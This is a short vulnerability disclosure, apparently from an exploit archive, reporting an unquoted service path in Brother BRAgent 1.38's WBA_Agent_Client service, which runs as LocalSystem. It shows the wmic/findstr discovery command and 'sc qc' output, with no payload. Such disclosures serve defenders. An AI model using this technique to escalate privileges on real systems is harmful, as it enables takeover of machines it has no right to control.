    # Exploit Title: Brother BRAgent 1.38 - 'WBA_Agent_Client' Unquoted Service Path
    # Discovery by: Brian Rodriguez
    # Date: 14-06-2021
    # Vendor Homepage: https://brother.com
    # Software Link: https://support.brother.com/g/b/downloadhowto.aspx?c=us&lang=en&prod=ads1000w_us&os=10013&dlid=dlf002778_000&flang=4&type3=46
    # Tested Version: 1.38
    # Vulnerability Type: Unquoted Service Path
    # Tested on: Windows 10 Enterprise 64 bits

    # Step to discover Unquoted Service Path:

    C:\>wmic service get name,displayname,pathname,startmode |findstr /i "auto"
    |findstr /i /v "c:\windows\\" |findstr /i /v """
    Brother BRAgent    WBA_Agent_Client   C:\Program Files
    (x86)\Brother\BRAgent\BRAgtSrv.exe   Auto

    C:\>sc qc WBA_Agent_Client
    [SC] QueryServiceConfig CORRECTO

    NOMBRE_SERVICIO: WBA_Agent_Client
            TIPO               : 10  WIN32_OWN_PROCESS
            TIPO_INICIO        : 2   AUTO_START
            CONTROL_ERROR      : 1   NORMAL
            NOMBRE_RUTA_BINARIO: C:\Program Files
    (x86)\Brother\BRAgent\BRAgtSrv.exe
            GRUPO_ORDEN_CARGA  :
            ETIQUETA           : 0
            NOMBRE_MOSTRAR     : Brother BRAgent
            DEPENDENCIAS       :
            NOMBRE_INICIO_SERVICIO: LocalSystem